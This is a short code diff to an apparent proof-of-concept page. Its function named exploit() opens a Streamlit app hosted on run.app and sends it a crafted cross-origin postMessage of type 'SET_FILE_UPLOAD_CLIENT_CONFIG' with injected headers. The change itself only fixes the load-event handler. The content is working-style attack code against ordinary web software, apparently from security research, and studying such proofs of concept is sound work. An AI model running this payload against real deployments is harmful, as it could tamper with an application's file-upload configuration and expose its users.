@@ -10,7 +10,7 @@
     function exploit() {
         const w = window.open('https://activate-fwwrn5gbiq-ey.a.run.app', 'poc-streamlit');
         // const iframe = document.getElementsByTagName('iframe')[0];
-        w.onload(() => {
+        w.addEventListener('load', () => {
              w.postMessage({
             stCommVersion: 1,
             type: "SET_FILE_UPLOAD_CLIENT_CONFIG",
@@ -18,7 +18,7 @@
             headers: {"abc": "def"}
         }, 'https://activate-fwwrn5gbiq-ey.a.run.app');
         alert('Message sent');
-        });
+        }, false);
        
     }
 </script>
